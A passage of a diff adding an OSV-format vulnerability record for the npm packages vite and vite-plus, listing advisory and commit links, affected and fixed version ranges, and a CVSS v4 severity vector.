+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112947"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/pull/23655"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/b6c6d2fb3f853aab4092dc25f0d6816a96c23dff"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/ba8b7ab43b4afa5d0292ab4b6e3a7b5033cc9c73"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.3.0"
+                },
+                {
+                  "fixed": "8.3.3"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-vfpm-58rq-9qcg/GHSA-vfpm-58rq-9qcg.json",
+            "last_known_affected_version_range": "<= 8.3.2"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.2.0"
+                },
+                {
+                  "fixed": "8.2.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.2.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-vfpm-58rq-9qcg/GHSA-vfpm-58rq-9qcg.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite-plus",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite-plus"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.2.8"
+                },
+                {
+                  "fixed": "1.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 1.0.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-vfpm-58rq-9qcg/GHSA-vfpm-58rq-9qcg.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    }
+  ]
+}
